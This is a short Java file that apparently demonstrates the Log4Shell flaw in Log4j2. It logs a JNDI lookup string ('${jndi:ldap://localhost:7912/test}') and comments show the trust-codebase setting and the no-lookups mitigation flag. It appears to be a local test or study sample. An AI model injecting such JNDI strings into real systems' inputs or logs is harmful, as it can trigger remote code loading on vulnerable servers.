package net;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4J {

    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {

        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        // -Dlog4j2.formatMsgNoLookups=true
        logger.error("${jndi:ldap://localhost:7912/test}");
    }
}
